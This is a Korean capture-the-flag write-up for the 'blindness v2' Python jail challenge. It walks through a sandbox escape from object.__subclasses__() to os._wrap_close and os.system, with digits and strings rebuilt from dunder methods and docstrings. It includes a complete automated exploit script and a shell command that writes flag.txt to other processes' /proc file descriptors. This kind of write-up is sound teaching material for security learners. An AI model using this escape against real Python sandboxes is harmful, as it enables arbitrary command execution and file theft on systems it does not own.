# blindness v2

## 문제 설명

> 👁️

nc challs.pyjail.club 24747

입력한 내용은 Python 코드로 실행되지만, 사용할 수 있는 문자가 매우 적고 출력도 보이지 않는다.

## 풀이

### 분석

처음에는 `flag` 변수가 이미 있으니 다음처럼 출력하면 될 것이라고 생각했다.

```python
print(flag)
```

하지만 `print`는 영문 소문자 이외에 문제는 없어 보여도, 실행 전에 builtins가 삭제되기 때문에 사용할 수 없다. 게다가 부모 프로세스에서 `stdout`까지 닫아 놓았다.

그래도 입력 가능한 문자에 `.`, `_`, `(`, `)`가 포함되어 있었다. 이 문자들이 있으면 Python 객체의 내부 속성을 따라갈 수 있다.

```python
().__class__
```

결과는 `tuple` 클래스이다. 여기서 모든 클래스의 부모인 `object`로 이동할 수 있다.

```python
().__class__.__base__
```

그리고 `object.__subclasses__()`를 이용하면 현재 Python에 올라와 있는 클래스 목록을 가져올 수 있다.

```python
().__class__.__base__.__subclasses__()
```

원격 서버에서는 이 목록의 167번째 위치에 `os._wrap_close`가 있었다.

```python
object.__subclasses__()[167]
# <class 'os._wrap_close'>
```

입력 필터 때문에 실제 payload에서는 `[167]`을 쓸 수 없다. 대신 `__getitem__()`과 dunder 연산으로 같은 동작을 만들었다.

`os._wrap_close`의 `__init__`은 Python으로 작성된 함수이다. Python 함수의 `__globals__`에는 그 함수가 만들어진 모듈의 전역 변수들이 들어 있다.

따라서 다음 경로를 이용하면 삭제된 `os.system`을 다시 찾을 수 있다.

```python
os._wrap_close.__init__.__globals__.get("system")
```

### 취약점

이 문제는 builtins를 지우기는 했지만, 이미 메모리에 올라온 클래스까지 없애지는 않았다.

정리하면 다음 순서로 Sandbox를 빠져나갈 수 있었다.

1. `object.__subclasses__()`로 로드된 클래스 목록을 구한다.
2. 그중 `os._wrap_close`를 찾는다.
3. `__init__.__globals__`로 `os` 모듈 내부에 접근한다.
4. `os.system`을 가져와 셸 명령을 실행한다.

문제는 따옴표와 숫자를 입력할 수 없다는 점이다.

숫자 `0`과 `1`은 다음처럼 만들었다.

```python
().__len__()       # 빈 tuple 길이이므로 0
().__eq__(())      # 빈 tuple과 같으므로 True, 숫자로는 1
```

더 큰 숫자는 `__add__()`와 `__mul__()`을 이용해서 조립했다.

문자열은 이미 존재하는 `str` 클래스의 설명문에서 한 글자씩 가져왔다.

```python
flag.__class__.__doc__.__getitem__(숫자)
```

예를 들어 필요한 글자를 하나씩 꺼낸 뒤 `__add__()`로 이어 붙이면 `"system"`이나 셸 명령도 만들 수 있다.

여기까지 만든 뒤 처음에는 아래 명령을 실행해 보았다.

```sh
cat flag.txt
```

하지만 아무것도 출력되지 않았다. 코드를 다시 보니 자식 프로세스의 출력은 `subprocess.PIPE`에 저장된 뒤 사용되지 않고 있었다.

그래서 `/proc`에 있는 다른 프로세스의 파일 디스크립터로 플래그를 직접 쓰기로 했다.

```sh
tee /proc/*/fd/1 /proc/*/fd/2 <flag.txt
```

부모 문제 프로세스의 fd 1 또는 fd 2는 네트워크 연결로 이어져 있으므로, 이곳에 쓰면 플래그를 받을 수 있다.

### 익스플로잇

payload가 매우 길어 손으로 작성하기는 어려워 Python으로 자동 생성했다.

전체 익스플로잇 코드

```python
#!/usr/bin/env python3
import socket
import sys
import os


HOST = os.environ.get("HOST", "challs.pyjail.club")
PORT = int(os.environ.get("PORT", "24747"))

ZERO = "().__len__()"
ONE = "().__eq__(())"
TWO = f"{ONE}.__add__({ONE})"
STR_DOC = "flag.__class__.__doc__"
TARGET_STR_DOC = """str(object='') -> str
str(bytes_or_buffer[, encoding[, errors]]) -> str

Create a new string object from the given object. If encoding or
errors is specified, then the object must expose a data buffer
that will be decoded using the given encoding and error handler.
Otherwise, returns the result of object.__str__() (if defined)
or repr(object).
encoding defaults to 'utf-8'.
errors defaults to 'strict'."""


def number(n: int) -> str:
    if n == 0:
        return ZERO
    if n == 1:
        return ONE
    if n % 2 == 0:
        return f"{number(n // 2)}.__mul__({TWO})"
    return f"{number(n - 1)}.__add__({ONE})"


def doc_char(char: str) -> str:
    index = TARGET_STR_DOC.index(char)
    return f"{STR_DOC}.__getitem__({number(index)})"


def make_string(value: str) -> str:
    parts = []
    for char in value:
        if char == "&":
            parts.append(
                f"{ZERO}.__and__.__doc__.__getitem__({number(11)})"
            )
        elif char == "/":
            parts.append(
                f"{ZERO}.__floordiv__.__doc__.__getitem__({number(11)})"
            )
        elif char == "*":
            parts.append(
                f"{ZERO}.__mul__.__doc__.__getitem__({number(11)})"
            )
        elif char == "<":
            parts.append(
                f"{ZERO}.__lt__.__doc__.__getitem__({number(11)})"
            )
        elif char.isdigit():
            parts.append(f"{number(int(char))}.__int__().__str__()")
        else:
            parts.append(doc_char(char))
    result = parts[0]
    for part in parts[1:]:
        result = f"{result}.__add__({part})"
    return result


WRAP_INDEX = int(os.environ.get("INDEX", "167"))
wrap_close = (
    "().__class__.__base__.__subclasses__()"
    f".__getitem__({number(WRAP_INDEX)})"
)
def build_payload(shell_command: str) -> str:
    system = make_string("system")
    command = make_string(shell_command)
    result = f"{wrap_close}.__init__.__globals__.get({system})({command})"
    assert all(
        c in "()._abcdefghijklmnopqrstuvwxyz" or c.isspace()
        for c in result
    )
    return result


def main() -> None:
    shell_command = os.environ.get(
        "CMD", "tee /proc/*/fd/1 /proc/*/fd/2 <flag.txt"
    )
    payload = build_payload(shell_command)
    if len(sys.argv) > 1 and sys.argv[1] == "--print":
        print(payload)
        return

    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        data = b""
        while b"blindness > " not in data:
            chunk = sock.recv(4096)
            if not chunk:
                raise RuntimeError("service closed before prompt")
            data += chunk
        sock.sendall(payload.encode() + b"\n")
        sock.settimeout(5)
        output = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            output += chunk
    print(output.decode(errors="replace"))


if __name__ == "__main__":
    main()

```

익스플로잇 코드에서 중요한 부분을 나누어 보면 다음과 같다.

```python
ZERO = "().__len__()"
ONE = "().__eq__(())"
TWO = f"{ONE}.__add__({ONE})"
```

입력 필터 때문에 숫자를 직접 사용할 수 없다. 빈 tuple의 길이로 `0`을 만들고, 빈 tuple끼리 비교한 결과인 `True`를 `1`로 사용한다. `2`는 `1 + 1`로 만든다.

```python
STR_DOC = "flag.__class__.__doc__"
TARGET_STR_DOC = """str(object='') -> str
...
errors defaults to 'strict'."""
```

`STR_DOC`는 원격에서 `str.__doc__`에 접근하는 표현식이다. `TARGET_STR_DOC`는 원격 Python의 실제 설명문을 복사한 문자열이며, 필요한 글자의 위치를 계산할 때 사용한다. 단순한 주석이 아니므로 삭제하면 안 된다.

```python
def number(n):
    if n % 2 == 0:
        return f"{number(n // 2)}.__mul__({TWO})"
    return f"{number(n - 1)}.__add__({ONE})"
```

`number()`는 `167` 같은 숫자를 `__add__()`와 `__mul__()`만 사용하는 표현식으로 바꾼다. 이렇게 생성된 결과는 문제의 문자 필터를 통과할 수 있다.

```python
def doc_char(char):
    index = TARGET_STR_DOC.index(char)
    return f"{STR_DOC}.__getitem__({number(index)})"
```

`doc_char()`는 설명문에서 원하는 글자의 위치를 찾는다. 그다음 원격의 `str.__doc__`에서 같은 위치의 글자 하나를 꺼내는 payload를 만든다.

```python
def make_string(value):
    ...
    result = f"{result}.__add__({part})"
    return result
```

`make_string()`은 `doc_char()`로 만든 글자들을 이어 붙여 `"system"`이나 셸 명령을 만든다. `/`, `*`, `<`, 숫자는 다른 dunder 메서드의 docstring과 `__str__()`을 이용해 별도로 만든다.

```python
WRAP_INDEX = 167
wrap_close = (
    "().__class__.__base__.__subclasses__()"
    f".__getitem__({number(WRAP_INDEX)})"
)
```

원격 환경에서 `object.__subclasses__()[167]`은 `os._wrap_close`이다. 대괄호와 숫자를 직접 쓸 수 없으므로 `__getitem__()`과 `number()`를 사용한다.

```python
result = (
    f"{wrap_close}.__init__.__globals__"
    f".get({system})({command})"
)
```

`os._wrap_close.__init__.__globals__`에서 `os.system`을 가져온 뒤, 만들어 둔 셸 명령을 실행하는 최종 payload를 조립한다.

```python
shell_command = "tee /proc/*/fd/1 /proc/*/fd/2 <flag.txt"
```

자식 프로세스의 일반 출력은 캡처된 뒤 버려진다. 따라서 `/proc`에서 부모 프로세스의 네트워크 fd를 찾아 플래그를 직접 기록한다.

```python
with socket.create_connection((HOST, PORT), timeout=10) as sock:
    sock.sendall(payload.encode() + b"\n")
```

마지막으로 서버의 프롬프트를 기다린 뒤 payload를 전송하고, 돌아오는 플래그를 받아 출력한다.

생성된 payload가 필터를 통과하는지도 실행 전에 확인했다.

```python
assert all(
    c in "()._abcdefghijklmnopqrstuvwxyz" or c.isspace()
    for c in payload
)
```

실행 결과는 다음과 같다.

```console
$ python solve.py
jail{more_leak_24a3cea7b657c8b7}
jail{more_leak_24a3cea7b657c8b7}
```

`tee`로 fd 1과 fd 2에 모두 기록했기 때문에 플래그가 두 번 출력되었다.

## 플래그

```text
jail{more_leak_24a3cea7b657c8b7}
```

## 배운 점

- builtins를 지운다고 해서 Python 객체까지 모두 사라지는 것은 아니다.
- `__class__`, `__base__`, `__subclasses__`를 차례로 따라가면 여러 내부 클래스에 접근할 수 있다.
- 직접 입력할 수 없는 숫자와 문자열도 기존 객체와 dunder 메서드로 만들 수 있다.
- `os.system`을 얻는 것만으로 끝이 아니라, 출력이 어디로 가는지도 확인해야 한다.
- 처음에는 `cat flag.txt`까지만 생각했는데, 출력이 버려진다는 것을 확인하고 `/proc/*/fd/*`를 이용해야 했다.
- `object.__subclasses__()`의 순서는 환경에 따라 바뀔 수 있다. 실제로 로컬에서는 인덱스가 166이었지만 원격에서는 167이었다.
